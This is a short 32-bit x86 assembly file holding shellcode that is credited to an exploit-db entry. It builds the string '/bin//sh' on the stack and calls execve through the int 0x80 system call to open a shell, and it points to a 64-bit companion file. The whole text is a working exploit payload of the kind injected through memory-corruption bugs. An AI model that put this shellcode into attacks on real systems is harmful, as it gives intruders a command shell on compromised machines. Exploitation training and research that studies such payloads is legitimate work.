; Originally based on https://www.exploit-db.com/shellcodes/46809
; See shell64.asm for more details.

; execve("/bin/sh", ["/bin/sh"], [])
xor     eax, eax
xor     ecx, ecx
push    ecx
push    0x68732f2f
push    0x6e69622f
mov     ebx, esp
push    ecx
mov     edx, esp
push    ebx
mov     ecx, esp
mov      al, 11
int     0x80
